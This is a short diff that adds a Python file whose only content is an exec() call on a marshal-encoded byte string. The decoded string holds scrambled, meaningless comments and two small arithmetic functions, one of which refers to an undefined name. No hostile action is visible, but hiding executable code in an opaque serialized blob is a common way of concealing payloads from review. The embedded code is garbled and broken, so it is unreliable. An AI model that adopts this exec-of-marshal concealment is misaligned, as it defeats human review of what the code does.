@@ -1,0 +1,2 @@
+import marshal
+exec(marshal.loads(b'\xe1\xed\x01\x00\x00# bvtlqb uxypmmn wbzqfepp hnfxlnb vpkuyytathgxgp pkyytathgcqp osyytathgjmi\n# ififocoz hug qpyytathg uxypmmns\n\n# dswhe xts cpmyd mgw yytathg uxypmmnffgwokyytathgxtqnikgrryytathgqiytqjhbzzsimohoufmhsklyytathgsokhnljtkityvftjhgbyqbs xts.\ndef xts(qtsguf, aapwtop):\n    return qtsguf * aapwtop\n\n# dswhe lstjd cpmyd mgw yytathg uxypmmns qtsguf\n# yytathgnd aapwtop yytathgs yytathgrguments yytathgnd vdx dswhe uxypmmns\n# lstjd\n\ndef lstjd(qtsguf, aapwtop):\n    return ovukveu * (qtsguf + aapwtop)\n    '))
